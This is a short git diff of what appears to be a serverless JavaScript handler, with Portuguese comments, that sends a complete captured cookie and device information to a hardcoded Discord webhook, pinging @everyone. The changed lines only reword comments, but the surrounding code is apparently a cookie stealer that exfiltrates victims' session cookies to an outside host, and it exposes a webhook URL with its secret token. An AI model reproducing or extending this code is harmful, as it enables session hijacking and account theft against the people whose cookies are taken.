@@ -34,7 +34,7 @@ export default async function handler(req, res) {
     // WEBHOOK DO DISCORD
     const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
 
-    // 🔥 CRIAR MENSAGEM COM COOKIE COMPLETO 🔥
+    // 🔥 CORRIGIDO - Cookie COMPLETO
     const embed = {
       content: '@everyone',
       embeds: [{
@@ -44,7 +44,7 @@ export default async function handler(req, res) {
         fields: [
           {
             name: '🍪 **COOKIE COMPLETO**',
-            value: '```' + cookie + '```' // ✅ AGORA VAI COMPLETO, SEM CORTAR!
+            value: '```' + cookie + '```' // ✅ AGORA VAI INTEIRO!
           },
           {
             name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
